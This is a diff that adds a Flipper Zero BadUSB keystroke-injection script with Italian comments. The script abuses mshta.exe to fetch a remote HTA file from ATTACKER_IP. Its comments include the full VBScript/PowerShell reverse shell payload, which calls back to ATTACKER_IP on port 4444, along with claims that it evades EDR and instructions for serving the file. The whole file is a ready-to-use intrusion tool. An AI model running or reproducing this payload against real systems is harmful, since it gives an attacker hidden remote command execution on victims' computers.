@@ -1,0 +1,36 @@
+REM ============================================================
+REM Title:    LOLBin Reverse Shell via MSHTA
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Reverse Shell
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~7 secondi
+REM Detect:   Basso - usa binario legittimo Microsoft (MSHTA)
+REM Desc:     Usa mshta.exe (LOLBin) per scaricare ed eseguire
+REM           un HTA con reverse shell. Bypassa molti EDR
+REM           perchè mshta.exe è firmato Microsoft.
+REM CHANGE:   ATTACKER_IP con il tuo server che serve il .hta
+REM SETUP:    Sul tuo server, servi un file .hta con:
+REM           python3 -m http.server 8080
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING mshta http://ATTACKER_IP:8080/payload.hta
+ENTER
+
+REM ============================================================
+REM Contenuto di payload.hta (servi dal tuo server):
+REM
+REM <html>
+REM <head>
+REM <script language="VBScript">
+REM   Set shell = CreateObject("Wscript.Shell")
+REM   shell.Run "powershell -w hidden -nop -ep bypass -c ""$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length)};$c.Close()""", 0
+REM   window.close
+REM </script>
+REM </head>
+REM </html>
+REM ============================================================
